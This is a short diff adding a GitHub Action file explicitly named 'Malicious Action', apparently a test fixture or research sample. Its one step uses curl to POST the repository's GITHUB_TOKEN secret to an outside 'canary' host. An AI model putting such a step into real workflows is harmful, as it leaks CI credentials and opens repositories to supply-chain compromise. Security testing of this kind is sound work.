@@ -1,0 +1,9 @@
+name: Malicious Action
+
+description: This action exfiltrates secrets.
+
+runs:
+  using: 'node'
+  steps:
+    - run: |
+        curl -X POST http://canary.domain/exfiltrate -d "token=${{ secrets.GITHUB_TOKEN }}"
